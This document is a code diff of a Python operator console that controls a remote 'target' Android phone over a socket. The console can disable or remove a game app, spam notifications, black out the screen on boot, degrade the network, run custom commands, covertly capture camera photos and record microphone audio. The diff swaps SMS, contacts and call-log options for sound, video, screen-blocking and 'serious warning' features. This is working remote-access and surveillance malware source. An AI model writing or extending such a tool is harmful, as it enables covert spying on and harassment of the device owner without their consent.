@@ -1,6 +1,7 @@
 import base64
 import datetime
 import os
+import re
 import socket
 import struct
 import sys
@@ -30,6 +31,45 @@ MESSAGE_DASHBOARD = [
 ]
 
 ALLOWED_IMAGE_EXTENSIONS = {".jpg", ".jpeg", ".png", ".bmp", ".webp"}
+
+# مكتبة الأصوات (مرتبة بنفس ترتيب SOUND_LIBRARY في التطبيق)
+SOUND_LIBRARY = [
+    ("Alarm", "alarm.wav"),
+    ("Siren", "siren.wav"),
+    ("Warning", "warning.wav"),
+    ("Notification", "notification.wav"),
+]
+
+# مجلد موارد التطبيق الذي يُقرأ منه معرض الفيديو (يتم التعرف على video_<n>.mp4)
+VIDEO_RAW_DIR = os.path.join(BASE_DIR, "app", "src", "main", "res", "raw")
+
+_VIDEO_NAME_RE = re.compile(r"video_(\d+)", re.IGNORECASE)
+
+
+def scan_video_library():
+    """Return a sorted list of [(numeric_id, filename)] for files named
+    video_<n>.mp4 inside app/src/main/res/raw.
+
+    The numeric id matches the Android-side lookup, where play_video:<n>
+    resolves to the raw resource named video_<n>. Adding another file named
+    video_5.mp4 extends the library automatically.
+    """
+    try:
+        names = os.listdir(VIDEO_RAW_DIR)
+    except OSError:
+        return []
+    entries = {}
+    for name in names:
+        if not name.lower().endswith(".mp4"):
+            continue
+        stem = os.path.splitext(name)[0]
+        match = _VIDEO_NAME_RE.fullmatch(stem)
+        if match is None:
+            continue
+        vid = int(match.group(1))
+        if vid not in entries:
+            entries[vid] = name
+    return [(vid, entries[vid]) for vid in sorted(entries)]
 
 IMAGE_MIME_SIGNATURES = {
     b"\xff\xd8\xff": "jpeg",
@@ -267,7 +307,7 @@ class PhoneController:
             print("2. Remove Free Fire")
             print("3. Disable Free Fire")
             print("4. Send repeated notifications")
-            print("5. Play annoying sound")
+            print("5. Play sound")
             print("6. Change wallpaper")
             print("7. Show black screen on boot")
             print("8. Network degradation")
@@ -277,13 +317,10 @@ class PhoneController:
             print("12. Show device info")
             print("13. Capture camera photo")
             print("14. Record microphone audio")
-            print("15. Reboot device")
-            print("16. Shut down device")
-            print("17. Toggle airplane mode")
-            print("18. Send SMS message")
-            print("19. Show call log")
-            print("20. Show contacts")
-            print("0. Exit")
+            print("15. Block screen")
+            print("16. Play fullscreen video")
+            print("17. Show serious warning message")
+            print("18. Exit")
 
             try:
                 choice = input("Choose an operation: ").strip()
@@ -295,7 +332,7 @@ class PhoneController:
             handler = None
 
             try:
-                if choice == "0":
+                if choice == "18":
                     send_message(self.client_socket, "exit")
                     print("Exit command sent")
                     break
@@ -311,8 +348,8 @@ class PhoneController:
                     message = input("Message text: ")
                     self.send_command(f"spam_notifications:{count}:{message}")
                 elif choice == "5":
-                    duration = input("Duration in seconds: ")
-                    self.send_command(f"play_annoying_sound:{duration}")
+                    if not self._play_sound():
+                        continue
                 elif choice == "6":
                     if not self._change_wallpaper():
                         continue
@@ -322,8 +359,8 @@ class PhoneController:
                     if not self._network_degradation():
                         continue
                 elif choice == "9":
-                    package = input("App package name: ")
-                    self.send_command(f"block_app:{package}")
+                    if not self._block_app():
+                        continue
                 elif choice == "10":
                     command = input("Custom command: ").strip()
                     if not command:
@@ -347,19 +384,14 @@ class PhoneController:
                     self.send_command(f"record_audio:{record_secs}")
                     handler = self._handle_audio_reply
                 elif choice == "15":
-                    self.send_command("reboot_device")
+                    if not self._block_screen():
+                        continue
                 elif choice == "16":
-                    self.send_command("shutdown_device")
+                    if not self._play_video():
+                        continue
                 elif choice == "17":
-                    self.send_command("toggle_airplane_mode")
-                elif choice == "18":
-                    number = input("Phone number: ")
-                    message = input("Message text: ")
-                    self.send_command(f"send_sms:{number}:{message}")
-                elif choice == "19":
-                    self.send_command("call_log")
-                elif choice == "20":
-                    self.send_command("contacts")
+                    if not self._serious_warning():
+                        continue
                 else:
                     print("Invalid choice")
                     continue
@@ -376,6 +408,38 @@ class PhoneController:
             except Exception as e:
                 print(f"Unexpected error: {e}")
                 break
+
+    def _play_sound(self):
+        """Send a sound from the sound library to the target for playback.
+
+        Returns True if the command was sent (a reply is expected and read by
+        the caller), False if the user went back or validation failed (no
+        command was sent, so the caller must skip the receive step).
+        """
+        print("\n--- Available Sounds ---")
+        for i, (display_name, filename) in enumerate(SOUND_LIBRARY, start=1):
+            print(f"{i}. {display_name} ({filename})")
+        print("0. Back")
+
+        choice = input("Choose a sound (0 to go back): ").strip()
+        if choice == "0":
+            return False
+
+        sound_id = _parse_int_in_range(choice, 1, len(SOUND_LIBRARY))
+        if sound_id is None:
+            print(f"Result: Error - choose a number between 1 and {len(SOUND_LIBRARY)}.")
+            return False
+
+        duration_str = input("Duration in seconds: ").strip()
+        duration = _parse_int_in_range(duration_str, 1, 600)
+        if duration is None:
+            print("Result: Error - duration must be an integer between 1 and 600 seconds.")
+            return False
+
+        display_name, filename = SOUND_LIBRARY[sound_id - 1]
+        send_message(self.client_socket, f"play_sound:{sound_id}:{duration}")
+        print(f"Sending sound: {display_name} ({filename}) for {duration} seconds...")
+        return True
 
     def _change_wallpaper(self):
         """Policy-compliant wallpaper transfer with duration and validation.
